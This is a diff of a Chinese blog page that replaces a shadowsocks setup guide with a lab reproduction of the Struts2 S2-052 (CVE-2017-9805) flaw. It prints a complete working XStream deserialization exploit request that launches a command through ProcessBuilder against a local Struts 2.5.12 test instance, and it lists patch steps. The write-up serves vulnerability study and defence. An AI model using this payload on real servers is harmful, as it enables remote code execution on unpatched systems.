@@ -45,7 +45,7 @@
 <link href="/css/main.css?v=5.1.0" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="shadowsocks," />
+  <meta name="keywords" content="s2-052,漏洞," />
 
 
 
@@ -63,21 +63,25 @@
 
 
 
-<meta name="description" content="搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。">
-<meta name="keywords" content="shadowsocks">
+<meta name="description" content="struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究 s2-052漏洞介绍问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12 s2-">
+<meta name="keywords" content="s2-052,漏洞">
 <meta property="og:type" content="article">
-<meta property="og:title" content="搭建shadowsocks服务">
-<meta property="og:url" content="http://y-hkl.top/2017/09/02/搭建shadowsocks服务/index.html">
+<meta property="og:title" content="s2-052复现">
+<meta property="og:url" content="http://y-hkl.top/2017/09/08/s2-052复现/index.html">
 <meta property="og:site_name" content="Y-HKL&#39;s Blog">
-<meta property="og:description" content="搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。">
+<meta property="og:description" content="struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究 s2-052漏洞介绍问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12 s2-">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://y-hkl.top/upload_img/shadowsocks_1.png">
-<meta property="og:image" content="http://y-hkl.top/upload_img/shadowsocks_2.png">
-<meta property="og:updated_time" content="2017-09-02T06:55:55.285Z">
+<meta property="og:image" content="http://y-hkl.top/upload_img/s2_052_1.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/s2_052_2.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/s2_052_3.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/s2_052_4.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/s2_052_5.png">
+<meta property="og:image" content="http://y-hkl.top/upload_img/s2_052_6.png">
+<meta property="og:updated_time" content="2017-09-08T08:35:11.342Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="搭建shadowsocks服务">
-<meta name="twitter:description" content="搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。">
-<meta name="twitter:image" content="http://y-hkl.top/upload_img/shadowsocks_1.png">
+<meta name="twitter:title" content="s2-052复现">
+<meta name="twitter:description" content="struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究 s2-052漏洞介绍问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反漏洞编号：CVE-2017-9805(S2-052)影响版本：Struts 2.5 - Struts 2.5.12 s2-">
+<meta name="twitter:image" content="http://y-hkl.top/upload_img/s2_052_1.png">
 
 
 
@@ -105,13 +109,13 @@
 
 
 
-  <link rel="canonical" href="http://y-hkl.top/2017/09/02/搭建shadowsocks服务/"/>
+  <link rel="canonical" href="http://y-hkl.top/2017/09/08/s2-052复现/"/>
 
 
 
 
 
-  <title> 搭建shadowsocks服务 | Y-HKL's Blog </title>
+  <title> s2-052复现 | Y-HKL's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -284,7 +288,7 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://y-hkl.top/2017/09/02/搭建shadowsocks服务/">
+    <link itemprop="mainEntityOfPage" href="http://y-hkl.top/2017/09/08/s2-052复现/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Y-HKL">
@@ -305,7 +309,7 @@
             
             
               
-                搭建shadowsocks服务
+                s2-052复现
               
             
           </h1>
@@ -320,8 +324,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-02T02:15:21-04:00">
-                2017-09-02
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-09-08T03:35:17-04:00">
+                2017-09-08
               </time>
             
 
@@ -343,8 +347,8 @@
               
               
                 <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/技术研究/" itemprop="url" rel="index">
-                    <span itemprop="name">技术研究</span>
+                  <a href="/categories/漏洞复现/" itemprop="url" rel="index">
+                    <span itemprop="name">漏洞复现</span>
                   </a>
                 </span>
 
@@ -361,9 +365,9 @@
                 <span class="post-meta-item-icon">
                   <i class="fa fa-comment-o"></i>
                 </span>
-                <a href="/2017/09/02/搭建shadowsocks服务/#comments" itemprop="discussionUrl">
+                <a href="/2017/09/08/s2-052复现/#comments" itemprop="discussionUrl">
                   <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2017/09/02/搭建shadowsocks服务/" itemprop="commentCount"></span>
+                        data-disqus-identifier="2017/09/08/s2-052复现/" itemprop="commentCount"></span>
                 </a>
               </span>
             
@@ -389,26 +393,19 @@
       
 
       
-        <p>搭建ss服务器可以登录外网查询资料，访问谷歌，方便自己的使用。在服务器上搭建shadowsocks服务端，本地服务器上搭建客户端用来连接使用。<br><a id="more"></a></p>
-<h2 id="安装前的准备"><a href="#安装前的准备" class="headerlink" title="安装前的准备"></a>安装前的准备</h2><h3 id="安装pip"><a href="#安装pip" class="headerlink" title="安装pip"></a>安装pip</h3><p>从pip官网 <a href="https://pypi.python.org/pypi/pip" target="_blank" rel="external">https://pypi.python.org/pypi/pip</a> 下载pip的源代码</p>
-<p>#解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">tar -zxvf pip-1.5.5.tar.gz</div></pre></td></tr></table></figure></p>
-<p>这个时候会报错说少了setuptools<br>从setuptools官网 <a href="https://pypi.python.org/pypi/setuptools" target="_blank" rel="external">https://pypi.python.org/pypi/setuptools</a> 下载setuptools原来</p>
-<p>#解压<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">tar -zxvf setuptools-3.6.tar.gz </div><div class="line">cd setuptools-3.6</div></pre></td></tr></table></figure></p>
-<p>#安装<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python setup.py install</div></pre></td></tr></table></figure></p>
-<p>再次安装pip就OK了</p>
-<h3 id="安装M2Crypto"><a href="#安装M2Crypto" class="headerlink" title="安装M2Crypto"></a>安装M2Crypto</h3><p>先安装依赖包：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">yum install -y openssl-devel gcc swig python-devel autoconf libtool</div></pre></td></tr></table></figure></p>
-<p>再通过pip安装M2Crypto：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install M2Crypto</div></pre></td></tr></table></figure></p>
-<h2 id="安装shadowsocks"><a href="#安装shadowsocks" class="headerlink" title="安装shadowsocks"></a>安装shadowsocks</h2><p>使用pip安装shadowsocks<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">pip install shadowsocks</div></pre></td></tr></table></figure></p>
-<h2 id="配置config文件"><a href="#配置config文件" class="headerlink" title="配置config文件"></a>配置config文件</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vim /etc/shadowsocks.json</div></pre></td></tr></table></figure>
-<p>单用户配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;server&quot;:&quot;&quot;,     ##服务器ip地址</div><div class="line">&quot;server_port&quot;:8000,  ##代理端口</div><div class="line">&quot;local_address&quot;:&quot;127.0.0.1&quot;,</div><div class="line">&quot;local_port&quot;:1080, ##本地监听端口</div><div class="line">&quot;password&quot;:&quot;&quot;,   ##连接密码</div><div class="line">&quot;timeout&quot;:300,</div><div class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;, ##加密方式</div><div class="line">&quot;dast_open&quot;:false</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<p>多用户配置:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">&#123;</div><div class="line">&quot;server&quot;:&quot;&quot;,</div><div class="line">&quot;local_address&quot;:&quot;127.0.0.1&quot;,</div><div class="line">&quot;local_port&quot;:1080,</div><div class="line">&quot;port_password&quot;:&#123;</div><div class="line">&quot;8000&quot;:&quot;123456&quot;,</div><div class="line">&quot;8001&quot;:&quot;123456&quot;</div><div class="line">&#125;,</div><div class="line">&quot;timeout&quot;:300,</div><div class="line">&quot;method&quot;:&quot;aes-256-cfb&quot;,</div><div class="line">&quot;fast_open&quot;:false</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
-<h2 id="命令行启动关闭"><a href="#命令行启动关闭" class="headerlink" title="命令行启动关闭"></a>命令行启动关闭</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">ssserver -c /etc/shadowsocks/config.json -d start 后台启动</div><div class="line">ssserver -c /etc/shadowsocks/config.json -d stop 后台停止</div></pre></td></tr></table></figure>
-<h2 id="设置开机启动"><a href="#设置开机启动" class="headerlink" title="设置开机启动"></a>设置开机启动</h2><p>将启动的命令加入到/etc/rc.local文件的最后<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">vi /etc/rc.local</div></pre></td></tr></table></figure></p>
-<h2 id="设置非root用户运行ss"><a href="#设置非root用户运行ss" class="headerlink" title="设置非root用户运行ss"></a>设置非root用户运行ss</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">useradd ssuser //添加一个ssuser用户</div><div class="line">ssserver [other options] --user ssuser //用ssuser这个用户来运行ss</div></pre></td></tr></table></figure>
-<p>将之前的ssserver -c /etc/shadowsocks.json -d start改为ssserver -c /etc/shadowsocks.json -d start –user ssuser</p>
-<h2 id="防火墙设置（如有）"><a href="#防火墙设置（如有）" class="headerlink" title="防火墙设置（如有）"></a>防火墙设置（如有）</h2><p>编辑防火墙配置文件/etc/sysconfig/iptables，将服务器端口（server_port）放行。新增一条防火墙规则：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">-A INPUT -m state --state NEW -m tcp -p tcp --dport 8989 -j ACCEPT</div></pre></td></tr></table></figure></p>
-<p>重启防火墙iptables：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">service iptables restart</div></pre></td></tr></table></figure></p>
-<h2 id="安装客户端"><a href="#安装客户端" class="headerlink" title="安装客户端"></a>安装客户端</h2><p>windows安装shadowsocks客户端比较简单，直接下载安装程序。<br>启动以后，填入服务端相应的配置（ip，port，密码，加密方式）<br>设置模式：<br><img src="/upload_img/shadowsocks_1.png" alt=""><br><img src="/upload_img/shadowsocks_2.png" alt=""></p>
+        <p>struts2这两天又出新漏洞了，漏洞为s2-052，这里是对漏洞的复现。只用于个人研究</p>
+<h2 id="s2-052漏洞介绍"><a href="#s2-052漏洞介绍" class="headerlink" title="s2-052漏洞介绍"></a>s2-052漏洞介绍</h2><p>问题出现在struts2-rest-plugin插件XStreamHandler处理器中的toObject()方法，其中未对传入的值进行任何限制，在使用XStream反<br>漏洞编号：CVE-2017-9805(S2-052)<br>影响版本：Struts 2.5 - Struts 2.5.12</p>
+<h2 id="s2-052-POC"><a href="#s2-052-POC" class="headerlink" title="s2-052 POC"></a>s2-052 POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div></pre></td><td class="code"><pre><div class="line">POST /struts2-rest-showcase/orders/3;jsessionid=A82EAA2857A1FFAF61FF24A1FBB4A3C7 HTTP/1.1</div><div class="line">Host: 127.0.0.1:8080</div><div class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:54.0) Gecko/20100101 Firefox/54.0</div><div class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</div><div class="line">Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3</div><div class="line">Content-Type: application/xml</div><div class="line">Content-Length: 2365</div><div class="line">Referer: http://127.0.0.1:8080/struts2-rest-showcase/orders/3/edit</div><div class="line">Cookie: JSESSIONID=A82EAA2857A1FFAF61FF24A1FBB4A3C7</div><div class="line">Connection: close</div><div class="line">Upgrade-Insecure-Requests: 1</div><div class="line"></div><div class="line">&lt;map&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">      &lt;flags&gt;0&lt;/flags&gt;</div><div class="line">      &lt;value class=&quot;com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data&quot;&gt;</div><div class="line">        &lt;dataHandler&gt;</div><div class="line">          &lt;dataSource class=&quot;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource&quot;&gt;</div><div class="line">            &lt;is class=&quot;javax.crypto.CipherInputStream&quot;&gt;</div><div class="line">              &lt;cipher class=&quot;javax.crypto.NullCipher&quot;&gt;</div><div class="line">                &lt;initialized&gt;false&lt;/initialized&gt;</div><div class="line">                &lt;opmode&gt;0&lt;/opmode&gt;</div><div class="line">                &lt;serviceIterator class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                  &lt;iter class=&quot;javax.imageio.spi.FilterIterator&quot;&gt;</div><div class="line">                    &lt;iter class=&quot;java.util.Collections$EmptyIterator&quot;/&gt;</div><div class="line">                    &lt;next class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">                      &lt;command&gt;</div><div class="line">                        &lt;string&gt;calc&lt;/string&gt;</div><div class="line">                      &lt;/command&gt;</div><div class="line">                      &lt;redirectErrorStream&gt;false&lt;/redirectErrorStream&gt;</div><div class="line">                    &lt;/next&gt;</div><div class="line">                  &lt;/iter&gt;</div><div class="line">                  &lt;filter class=&quot;javax.imageio.ImageIO$ContainsFilter&quot;&gt;</div><div class="line">                    &lt;method&gt;</div><div class="line">                      &lt;class&gt;java.lang.ProcessBuilder&lt;/class&gt;</div><div class="line">                      &lt;name&gt;start&lt;/name&gt;</div><div class="line">                      &lt;parameter-types/&gt;</div><div class="line">                    &lt;/method&gt;</div><div class="line">                    &lt;name&gt;foo&lt;/name&gt;</div><div class="line">                  &lt;/filter&gt;</div><div class="line">                  &lt;next class=&quot;string&quot;&gt;foo&lt;/next&gt;</div><div class="line">                &lt;/serviceIterator&gt;</div><div class="line">                &lt;lock/&gt;</div><div class="line">              &lt;/cipher&gt;</div><div class="line">              &lt;input class=&quot;java.lang.ProcessBuilder$NullInputStream&quot;/&gt;</div><div class="line">              &lt;ibuffer&gt;&lt;/ibuffer&gt;</div><div class="line">              &lt;done&gt;false&lt;/done&gt;</div><div class="line">              &lt;ostart&gt;0&lt;/ostart&gt;</div><div class="line">              &lt;ofinish&gt;0&lt;/ofinish&gt;</div><div class="line">              &lt;closed&gt;false&lt;/closed&gt;</div><div class="line">            &lt;/is&gt;</div><div class="line">            &lt;consumed&gt;false&lt;/consumed&gt;</div><div class="line">          &lt;/dataSource&gt;</div><div class="line">          &lt;transferFlavors/&gt;</div><div class="line">        &lt;/dataHandler&gt;</div><div class="line">        &lt;dataLen&gt;0&lt;/dataLen&gt;</div><div class="line">      &lt;/value&gt;</div><div class="line">    &lt;/jdk.nashorn.internal.objects.NativeString&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">  &lt;entry&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">    &lt;jdk.nashorn.internal.objects.NativeString reference=&quot;../../entry/jdk.nashorn.internal.objects.NativeString&quot;/&gt;</div><div class="line">  &lt;/entry&gt;</div><div class="line">&lt;/map&gt;</div></pre></td></tr></table></figure>
+<p>注意：执行命令的地方在于command内,这里我是在windows上执行的，在其他系统中执行写出相对应的就可以了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;command&gt;</div><div class="line">&lt;string&gt;</div><div class="line">calc</div><div class="line">&lt;/string&gt;</div><div class="line">&lt;/command&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="s2-052漏洞复现"><a href="#s2-052漏洞复现" class="headerlink" title="s2-052漏洞复现"></a>s2-052漏洞复现</h2><h3 id="安装Java"><a href="#安装Java" class="headerlink" title="安装Java"></a>安装Java</h3><p>1.下载JDK<br>在官网上下载JDK <a href="http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html" target="_blank" rel="external">http://www.oracle.com/technetwork/java/javase/downloads/jdk8-downloads-2133151.html</a><br>我是在windows上搭建的所以，下载windows版本的<br>2.配置环境变量<br>2.1 新建系统变量：<br>变量名:JAVA_HOME<br>变量值:你的JDK安装目录<br>2.2 再新建系统变量：<br>变量名:CLASSPATH<br>值:.;%JAVA_HOME%\lib;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar;%TOMCAT_HOME%\BIN<br>注意：前面的点号<br>2.3 修改PATH变量<br>变量名:PATH<br>值: ;%JAVA_HOME%\bin;%JAVA_HOME%\jre\bin;<br>注意：前面的分号，将此值添加到，path变量值的最后面</p>
+<h3 id="安装Tomcat"><a href="#安装Tomcat" class="headerlink" title="安装Tomcat"></a>安装Tomcat</h3><h4 id="下载Tomcat"><a href="#下载Tomcat" class="headerlink" title="下载Tomcat"></a>下载Tomcat</h4><p>在官网上下载Tomcat <a href="http://tomcat.apache.org/download-90.cgi" target="_blank" rel="external">http://tomcat.apache.org/download-90.cgi</a><br>下载你需要的版本<br>下载完成以后解压到你想解压的目录就可以了</p>
+<h4 id="配置Tomcat的环境变量"><a href="#配置Tomcat的环境变量" class="headerlink" title="配置Tomcat的环境变量"></a>配置Tomcat的环境变量</h4><p>新建Tomcat环境变量<br>变量名:TOMCAT_HOME<br>变量值:你的TOMCAT所在目录</p>
+<h4 id="启动Tomcat"><a href="#启动Tomcat" class="headerlink" title="启动Tomcat"></a>启动Tomcat</h4><p>打开bin文件夹—双击startup.bat;系统会打开一个dos窗口，即启动成功；<br>如果未打开dos窗口或者dos窗口一闪而过，可能是jdk的配置出错，请安装上面的进行注意检查</p>
+<p>访问：<a href="http://127.0.0.1:8080" target="_blank" rel="external">http://127.0.0.1:8080</a><br>注意：若要修改tomcat端口，可打开/Library/Tomcat/conf/server.xml文件，修改8080端口。</p>
+<h3 id="下载受影响的struts2版本"><a href="#下载受影响的struts2版本" class="headerlink" title="下载受影响的struts2版本"></a>下载受影响的struts2版本</h3><p>1.从struts2的官网下载最后受影响的版本struts-2.5.12，地址： <a href="http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip" target="_blank" rel="external">http://archive.apache.org/dist/struts/2.5.12/struts-2.5.12-apps.zip</a> 注意下载struts-2.5.12-apps即可，不需要下载struts-2.5.12-all.zip。不然struts-2.5.12-all.zip中包含很多其他的东西，可以看到lib目录下有很多jar包。<br>2.拿到struts-2.5.12-apps之后，将其中的app目录下的struts2-rest-showcase.war文件放到webapps目录下，然后设置一下conf/server.xml文件即可。<br>3.这里把appBase设置为webapps目录，然后unpackWARs设置为true，这样就会自动解包xxx.war，autoDeploy也设置为true(热部署?) 然后就可以浏览器访问了。 直接输入 <a href="http://127.0.0.1:8080/struts2-rest-showcase/" target="_blank" rel="external">http://127.0.0.1:8080/struts2-rest-showcase/</a> 会跳转，然后出现下面的页面<br><img src="/upload_img/s2_052_1.png" alt=""></p>
+<h3 id="开始复现"><a href="#开始复现" class="headerlink" title="开始复现"></a>开始复现</h3><p>进入编辑页面<br><img src="/upload_img/s2_052_2.png" alt=""><br>设置抓包，点击提交按钮<br><img src="/upload_img/s2_052_3.png" alt=""><br><img src="/upload_img/s2_052_4.png" alt=""><br>修改Content-Type和POST提交的数据<br><img src="/upload_img/s2_052_5.png" alt=""><br>可以看到计算器已经调用出来<br><img src="/upload_img/s2_052_6.png" alt=""></p>
+<h2 id="修补方法"><a href="#修补方法" class="headerlink" title="修补方法"></a>修补方法</h2><p>1.升级Struts到2.5.13最新版本。<br>2.在不使用时删除Struts REST插件，或仅限于服务器普通页面和JSONs</p>
+<h2 id="python验证脚本"><a href="#python验证脚本" class="headerlink" title="python验证脚本"></a>python验证脚本</h2><p><a href="https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0" target="_blank" rel="external">https://github.com/ysrc/xunfeng/commit/f9ae69fe176c8bca622831e126cd94414ebe26f6?from=timeline&amp;isappinstalled=0</a></p>
 
       
     </div>
@@ -433,12 +430,12 @@
   <script type="text/javascript" src="http://jslibs.wuxubj.cn/sweetalert_mini/jquery-1.7.1.min.js"></script>
   <script src="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.min.js"></script>
   <link rel="stylesheet" type="text/css" href="http://jslibs.wuxubj.cn/sweetalert_mini/sweetalert.mini.css">
-  <p><span>本文标题:</span><a href="/2017/09/02/搭建shadowsocks服务/">搭建shadowsocks服务</a></p>
+  <p><span>本文标题:</span><a href="/2017/09/08/s2-052复现/">s2-052复现</a></p>
   <p><span>文章作者:</span><a href="/" title="访问 Y-HKL 的个人博客">Y-HKL</a></p>
-  <p><span>发布时间:</span>2017年09月02日 - 02:09</p>
-  <p><span>最后更新:</span>2017年09月02日 - 02:09</p>
-  <p><span>原始链接:</span><a href="/2017/09/02/搭建shadowsocks服务/" title="搭建shadowsocks服务">http://y-hkl.top/2017/09/02/搭建shadowsocks服务/</a>
-    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://y-hkl.top/2017/09/02/搭建shadowsocks服务/"  aria-label="复制成功！"></i></span>
+  <p><span>发布时间:</span>2017年09月08日 - 03:09</p>
+  <p><span>最后更新:</span>2017年09月08日 - 04:09</p>
+  <p><span>原始链接:</span><a href="/2017/09/08/s2-052复现/" title="s2-052复现">http://y-hkl.top/2017/09/08/s2-052复现/</a>
+    <span class="copy-path"  title="点击复制文章链接"><i class="fa fa-clipboard" data-clipboard-text="http://y-hkl.top/2017/09/08/s2-052复现/"  aria-label="复制成功！"></i></span>
   </p>
   <p><span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/4.0/" target="_blank" title="Attribution-NonCommercial-NoDerivatives 4.0 International (CC BY-NC-ND 4.0)">署名-非商业性使用-禁止演绎 4.0 国际</a> 转载请保留原文链接及作者。</p>  
 </div>
@@ -485,7 +482,9 @@
       
         <div class="post-tags">
           
-            <a href="/tags/shadowsocks/" rel="tag"><i class="fa fa-tag"></i> shadowsocks</a>
+            <a href="/tags/s2-052/" rel="tag"><i class="fa fa-tag"></i> s2-052</a>
+          
+            <a href="/tags/漏洞/" rel="tag"><i class="fa fa-tag"></i> 漏洞</a>
           
         </div>
       
@@ -498,8 +497,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2017/09/01/服务器解析漏洞/" rel="next" title="服务器解析漏洞">
-                <i class="fa fa-chevron-left"></i> 服务器解析漏洞
+              <a href="/2017/09/02/搭建shadowsocks服务/" rel="next" title="搭建shadowsocks服务">
+                <i class="fa fa-chevron-left"></i> 搭建shadowsocks服务
               </a>
             
           </div>
@@ -507,10 +506,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2017/09/08/s2-052复现/" rel="prev" title="s2-052复现">
-                s2-052复现 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -707,7 +702,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#安装前的准备"><span class="nav-number">1.</span> <span class="nav-text">安装前的准备</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装pip"><span class="nav-number">1.1.</span> <span class="nav-text">安装pip</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装M2Crypto"><span class="nav-number">1.2.</span> <span class="nav-text">安装M2Crypto</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装shadowsocks"><span class="nav-number">2.</span> <span class="nav-text">安装shadowsocks</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#配置config文件"><span class="nav-number">3.</span> <span class="nav-text">配置config文件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#命令行启动关闭"><span class="nav-number">4.</span> <span class="nav-text">命令行启动关闭</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置开机启动"><span class="nav-number">5.</span> <span class="nav-text">设置开机启动</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#设置非root用户运行ss"><span class="nav-number">6.</span> <span class="nav-text">设置非root用户运行ss</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#防火墙设置（如有）"><span class="nav-number">7.</span> <span class="nav-text">防火墙设置（如有）</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#安装客户端"><span class="nav-number">8.</span> <span class="nav-text">安装客户端</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#s2-052漏洞介绍"><span class="nav-number">1.</span> <span class="nav-text">s2-052漏洞介绍</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#s2-052-POC"><span class="nav-number">2.</span> <span class="nav-text">s2-052 POC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#s2-052漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">s2-052漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#安装Java"><span class="nav-number">3.1.</span> <span class="nav-text">安装Java</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#安装Tomcat"><span class="nav-number">3.2.</span> <span class="nav-text">安装Tomcat</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#下载Tomcat"><span class="nav-number">3.2.1.</span> <span class="nav-text">下载Tomcat</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#配置Tomcat的环境变量"><span class="nav-number">3.2.2.</span> <span class="nav-text">配置Tomcat的环境变量</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#启动Tomcat"><span class="nav-number">3.2.3.</span> <span class="nav-text">启动Tomcat</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#下载受影响的struts2版本"><span class="nav-number">3.3.</span> <span class="nav-text">下载受影响的struts2版本</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#开始复现"><span class="nav-number">3.4.</span> <span class="nav-text">开始复现</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修补方法"><span class="nav-number">4.</span> <span class="nav-text">修补方法</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#python验证脚本"><span class="nav-number">5.</span> <span class="nav-text">python验证脚本</span></a></li></ol></div>
             
 
           </div>
